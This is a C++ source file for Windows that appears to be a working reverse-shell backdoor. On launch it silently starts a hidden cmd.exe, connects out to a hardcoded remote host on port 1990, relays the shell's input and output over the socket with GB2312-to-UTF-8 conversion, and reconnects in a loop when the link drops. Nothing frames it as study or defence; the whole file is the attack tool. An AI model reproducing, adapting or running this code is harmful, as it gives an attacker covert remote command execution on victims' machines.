#include "stdafx.h"
#define PORT _T("1990")
//#define DOMAIN90 _T("192.168.1.10")
#define DOMAIN90 _T("vps.after1990s.info")

void UnicodeToUTF_8(char* pOut,WCHAR* pText)
{
	// 注意 WCHAR高低字的顺序,低字节在前，高字节在后
	char* pchar = (char *)pText;

	pOut[0] = (0xE0 | ((pchar[1] & 0xF0) >> 4));
	pOut[1] = (0x80 | ((pchar[1] & 0x0F) << 2)) + ((pchar[0] & 0xC0) >> 6);
	pOut[2] = (0x80 | (pchar[0] & 0x3F));

	return;
}
void Gb2312ToUnicode(WCHAR* pOut,char *gbBuffer)
{
	::MultiByteToWideChar(CP_ACP,MB_PRECOMPOSED,gbBuffer,2,pOut,1);
	return;
}
//GB2312 转为 UTF-8
void GB2312ToUTF_8(std::string& pOut,char *pText, int pLen)
{
	char* buf=(char*)malloc(1024*1024);
	char* rst = (char*)malloc(1024*1024);

	memset(buf,0,1024*1024);
	memset(rst,0,1024*1024);

	int i = 0;
	int j = 0;      
	while(i < pLen)
	{
		//如果是英文直接复制就可以
		if( *(pText + i) >= 0)
		{
			rst[j++] = pText[i++];
		}
		else
		{
			WCHAR pbuffer;
			Gb2312ToUnicode(&pbuffer,pText+i);

			UnicodeToUTF_8(buf,&pbuffer);

			unsigned short int tmp = 0;
			tmp = rst[j] = buf[0];
			tmp = rst[j+1] = buf[1];
			tmp = rst[j+2] = buf[2];


			j += 3;
			i += 2;
		}
	}
	strcpy(&rst[j],"\0");

	//返回结果
	pOut = rst;             
	free(rst);  
	free(buf);

	return;
}
void netRead(void* s)
{
	SHELL* shell = (SHELL*)s;
	int tmplen = 4086;
	DWORD recvlen = 0;
	DWORD writelen = 0;
	TCHAR tmp[4086]={0};
	while (true)
	{
		recvlen = recv(shell->sConnect, tmp, tmplen, 0);
		if (recvlen==0)
		{
			if (GetLastError()==0|| GetLastError()==0x2746)//server broken	//inform main thread , server broken.
			{
				SetEvent(shell->hServerBrokenEvent);
				break;
			}
		}
		WriteFile(shell->hParentWrite,tmp, recvlen, &writelen, 0);
		recvlen=0;
		writelen = 0;
		ZeroMemory(tmp, tmplen);
	}
	return ;
}
void  netWrite(void* s)
{
	SHELL* shell = (SHELL*)s;
	int tmplen = 4086;
	DWORD recvlen = 0;
	TCHAR tmp[4086]={0};
	std::string swrite;
	while(true)
	{
		WaitForSingleObject(shell->hParentRead, INFINITE);
		ReadFile(shell->hParentRead, tmp, tmplen, &recvlen, 0);
		if (recvlen==0)
		{
			if (GetLastError()==0)
				break;
		}
		GB2312ToUTF_8(swrite, tmp, recvlen);
		send(shell->sConnect, swrite.c_str(), swrite.length(), 0);
		recvlen = 0;
		ZeroMemory(tmp, tmplen);
		swrite.clear();
	}
	return ;
}
bool InitialSock()
{
	int iResult;
	WSADATA wsaData;
	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (iResult != 0) {
		return false;
	}
	return true;
}
int CALLBACK WinMain(
	_In_  HINSTANCE hInstance,
	_In_  HINSTANCE hPrevInstance,
	_In_  LPSTR lpCmdLine,
	_In_  int nCmdShow
	)
{
	if (!InitialSock())
		return 0;
	SECURITY_ATTRIBUTES saEvent = {0};
	saEvent.nLength = sizeof(saEvent);
	saEvent.bInheritHandle = false;
	while(true){
		HANDLE hServerBrokenEvent = CreateEvent(&saEvent,false, false, NULL);
		SOCKET sConnect = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		struct addrinfo *Sockaddr=NULL;
		struct addrinfo Hist ={0};
		Hist.ai_family = AF_INET;
		Hist.ai_flags = AI_CANONNAME;


		getaddrinfo(DOMAIN90, PORT, &Hist,&Sockaddr);
		while (connect(sConnect, Sockaddr->ai_addr, sizeof(sockaddr))==SOCKET_ERROR)
		{
			closesocket(sConnect);
			sConnect = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			Sleep(1000);
		}

		HANDLE hParentReadtmp, hParentRead, hChildWrite, hChildErr;
		HANDLE hParentWritetmp, hParentWrite, hChildRead;
		SECURITY_ATTRIBUTES sa={0};
		sa.bInheritHandle = true;
		sa.lpSecurityDescriptor = NULL;
		sa.nLength  =sizeof(sa);
		CreatePipe(&hParentReadtmp, &hChildWrite, &sa, sizeof(sa));
		CreatePipe(&hChildRead, &hParentWritetmp, &sa, sizeof(sa));
		DuplicateHandle(GetCurrentProcess(), hChildWrite, GetCurrentProcess(), &hChildErr, 0, true, DUPLICATE_SAME_ACCESS);
		DuplicateHandle(GetCurrentProcess(), hParentReadtmp, GetCurrentProcess(), &hParentRead, 0, true, DUPLICATE_SAME_ACCESS);
		DuplicateHandle(GetCurrentProcess(), hParentWritetmp, GetCurrentProcess(), &hParentWrite, 0, true, DUPLICATE_SAME_ACCESS);
		CloseHandle(hParentReadtmp);
		CloseHandle(hParentWritetmp);
		PROCESS_INFORMATION pi = {0};
		STARTUPINFO si ={0};
		si.cb=sizeof(STARTUPINFO);
		si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW ;
		si.hStdInput = hChildRead;
		si.hStdOutput = hChildWrite;
		si.hStdError = hChildErr;
		si.wShowWindow = SW_HIDE;
		
		CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,
			NULL,NULL,NULL,&si,&pi);
		SHELL s;
		s.hParentRead = hParentRead;
		s.hParentWrite = hParentWrite;
		s.sConnect = sConnect;
		s.hServerBrokenEvent = hServerBrokenEvent;
		_beginthread(netRead,0, &s);
		HANDLE hWrite = (HANDLE)_beginthread(netWrite, 0, &s);
		HANDLE hWaithandle[] = {hServerBrokenEvent, pi.hProcess};
		DWORD result = WaitForMultipleObjects(2, hWaithandle, false, INFINITE);
		switch(result)
		{
		case WAIT_OBJECT_0:
			//SERVER DOWN, close cmd, close pipe, close socket.	
			TerminateProcess(pi.hProcess, 0);
			closesocket(sConnect);
			freeaddrinfo(Sockaddr);
			TerminateThread(hWrite, 0);
			CloseHandle(hChildWrite);
			CloseHandle(hParentRead);
			CloseHandle(hChildErr);
			CloseHandle(hParentWrite);
			CloseHandle(hChildRead);
			break;
		case WAIT_OBJECT_0+1:
			//CMD.EXE terminated
			closesocket(sConnect);
			freeaddrinfo(Sockaddr);
			TerminateThread(hWrite, 0);
			CloseHandle(hChildWrite);
			CloseHandle(hParentRead);
			CloseHandle(hChildErr);
			CloseHandle(hParentWrite);
			CloseHandle(hChildRead);
			break;
		}
	}
}